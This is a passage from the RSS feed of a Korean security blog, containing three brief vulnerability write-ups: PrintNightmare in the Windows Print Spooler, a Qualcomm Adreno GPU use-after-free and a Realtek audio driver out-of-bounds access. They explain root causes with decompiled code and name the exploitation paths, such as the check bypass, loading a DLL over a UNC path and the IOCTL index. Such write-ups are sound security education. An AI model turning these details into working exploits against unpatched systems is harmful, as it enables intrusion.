      <guid>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/</guid>
      <pubDate>Thu, 01 Jul 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/afwu/PrintNightmare&quot;&gt;PrintNightmare (C</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/afwu/PrintNightmare">PrintNightmare (CVE-2021-1675): Remote code execution in Windows Spooler Service</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>PrintNightmare라는 이름의 Printer Spooler 원격 코드 실행 취약점의 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 프린터 서버에 드라이버를 추가하거나 업데이트하는 과정에서 발생합니다. <code>RpcAddPrinterDriver</code> 함수는 프린터 드라이버를 추가할 때 Spooler Service에 대한 검사를 수행합니다.</p><pre><code class="hljs c"><span class="hljs-number">1</span>:<span class="hljs-function">__int64 __fastcall <span class="hljs-title">SplAddPrinterDriverEx</span><span class="hljs-params">(.. <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a4 ..)</span></span>&#123;<span class="hljs-number">2</span>:...<span class="hljs-number">3</span>:<span class="hljs-number">4</span>:<span class="hljs-keyword">if</span>( !_bittest((<span class="hljs-keyword">const</span> <span class="hljs-keyword">int</span> *)&amp;a4, <span class="hljs-number">0xF</span>u))<span class="hljs-number">5</span>:v11 = a7;<span class="hljs-number">6</span>:<span class="hljs-keyword">if</span>(v11 &amp;&amp; !(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)ValidateObjectAccess(<span class="hljs-number">0</span>i64, <span class="hljs-number">1</span>i64, <span class="hljs-number">0</span>i64)<span class="hljs-number">7</span>:<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<span class="hljs-number">8</span>:<span class="hljs-keyword">return</span> InternalAddPrinterDriverEx(lpString1, a2, a3, a4, (struct _INISPOOLER *)a5, a6, v11, <span class="hljs-number">0</span>i64);<span class="hljs-number">9</span>:<span class="hljs-number">10</span>:&#125;</code></pre><p>line 4와 5에서 <code>a4</code>는 유저 권한의 사용자가 제어할 수 있으며 해커는 이를 이용해 검사를 우회하고 악성 DLL을 타겟 서버에 설치할 수 있습니다. 또한 프린터 드라이버 정보 구조체의 <code>pConfigFile</code>이 UNC 경로가 허용된다는 점을 이용해 원격으로 타겟 서버에 로드할 수 있으며 드라이버 업그레이드의 백업 기능으로 액세스 충돌을 우회하고 로드된 악성 dll을 spooler service에 삽입할 수 있습니다.</p><blockquote><p>UNC(Universal Naming Convention) : 네트워크 상의 공유 파일 경로 포맷 ex) \servername\sharename\path\filename</p></blockquote><p>해당 취약점에 대해 Microsoft는 2021년 6월 8일 Patch Tuesday 릴리즈에서 패치했지만 패치가 취약점을 해결하지 못한 것으로 알려졌습니다.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0">https://twitter.com/cyb3rops/status/1410232292308664323?fbclid=IwAR29FyubigoMk4rEoNsoIg0hKmN-ecCWHuwADnf0kRQJkxcQlOBikWvJBG0</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/rce/">rce</category>
      
      <category domain="https://hackyboiz.github.io/tags/microsoft/">microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/printer-spooler/">printer spooler</category>
      
      <category domain="https://hackyboiz.github.io/tags/printnightmare/">printnightmare</category>
      
      
      <comments>https://hackyboiz.github.io/2021/07/01/l0ch/2021-07-01/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</title>
      <link>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/</link>
      <guid>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/</guid>
      <pubDate>Wed, 30 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://googleprojectzero.github.io/0days-in-the-wild/0da</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://googleprojectzero.github.io/0days-in-the-wild/0day-RCAs/2021/CVE-2021-1905.html">CVE-2021-1905: Qualcomm Adreno GPU memory mapping use-after-free</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Qualcomm Adreno GPU</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Qualcomm Adreno GPU는 여러 프로세스의 메모리 매핑을 동싱에 처리하는 과정에서 Use-after-free 취약점이 발생합니다. GPU는 여러 VMA(Linux Virtual Memory Access)와 메모리 매핑을 공유하고 하나의 매핑이 닫히면 <code>kpsl_gpumem_vm_close</code> 함수를 호출해 <code>entry-&gt;memdesc.useraddr</code> 필드를 초기화합니다. 문제는 해당 필드가 여러 VMA에 공유되며 entry가 이미 매핑되었는지 확인하는 데 사용되므로 나머지 VMA에 의도하지 않은 버그가 발생합니다. Linux kernel mmap implementation에 따라 서로 다른 프로세스에서 동시에 호출이 불가능한 함수 <code>kpsl_get_unmapped_area</code>를 두 프로세스에서 같은 GPU 매핑에 대해 경쟁하도록 race condition을 발생시킬 수 있습니다. 따라서 구조체 <code>kpsl_mem_entry</code>가 서로 다른 두 프로세스에서 동시에 사용되어 use-after-free로 이어질 수 있습니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
      
      <category domain="https://hackyboiz.github.io/tags/android/">android</category>
      
      <category domain="https://hackyboiz.github.io/tags/uaf/">uaf</category>
      
      <category domain="https://hackyboiz.github.io/tags/race-condition/">race-condition</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/30/fabu1ous/2021-06-30/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2021-32537: Realtek 드라이버의 OOB Access 취약점</title>
      <link>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/</link>
      <guid>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/</guid>
      <pubDate>Tue, 29 Jun 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/0vercl0k/CVE-2021-32537&quot;&gt;CVE-2021-3253</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://github.com/0vercl0k/CVE-2021-32537">CVE-2021-32537: Out-of-bounds access in RTKVHD64 leading to pool corruption.</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Microsoft Surface Book/Pro</li><li>Lenovo Thinkpad</li><li>Dell XPS 13</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Realtek의 오디오 드라이버에서 OOB Access 취약점이 발견되어 세부 정보 및 PoC가 공개되었습니다.</p><p>취약점은 오디오 드라이버 <code>RTKVHD64.sys</code>에서 발생합니다. 해당 드라이버는 초기화 중 <code>PcAddAdapterDevice</code> 함수의 파라미터인 <code>StartDevice</code>에 의해 호출된 <code>InitDeviceExtension</code> 함수에서 커널 풀에 <code>MEVT</code> 구조체를 할당합니다.</p><pre><code class="hljs c">devext-&gt;unk-&gt;events = ExAllocatePoolWithTag(pooltype, 0x5F0ui64, &#x27;mEvt&#x27;);<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> &#123;</span>    PKSPIN_LOCK lock;    PVOID       event;    UINT64      someflag;&#125; <span class="hljs-comment">/* sizeof == 0x18 */</span><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MEVT</span> &#123;</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EVT</span> <span class="hljs-title">array</span>[63];</span>    UINT64 flags;&#125; <span class="hljs-comment">/* sizeof == 0x18*63 + 8 == 0x5f0 */</span></code></pre><p><code>MEVT</code>의 <code>EVT</code> 구조체는 63개의 고정된 크기의 배열입니다.</p><pre><code class="hljs c">input_index = *(_DWORD *)IrpSystemBuffer;v5 = Crash(mevts, <span class="hljs-built_in">stack</span>-&gt;FileObject, unk, &amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index].event,        (KSPIN_LOCK *)&amp;mevts-&gt;<span class="hljs-built_in">array</span>[input_index]);</code></pre><p>드라이버에 <code>0x225f04</code> IOCTL 코드를 전송하면 유저버퍼인 <code>IrpSystemBuffer</code>의 첫 번째 DWORD 데이터가 <code>input_index</code>에 저장됩니다. <code>input_index</code>는 위 <code>Crash</code> 함수에서 <code>(KSPIN_LOCK *)&amp;mevts-&gt;array[input_index]</code>와 같이 <code>MEVT</code>의 <code>EVT</code> 배열에 접근할 때 인덱스로 사용됩니다. 따라서 해커는 IOCTL 입력 버퍼를 통해 <code>input_index</code>를 임의의 값으로 설정할 수 있어 Out Of Bound Access로 이어집니다.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/driver/">driver</category>
      
      <category domain="https://hackyboiz.github.io/tags/realtek/">realtek</category>
      
      <category domain="https://hackyboiz.github.io/tags/out-of-bound/">out-of-bound</category>
      
      
      <comments>https://hackyboiz.github.io/2021/06/29/l0ch/2021-06-29/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
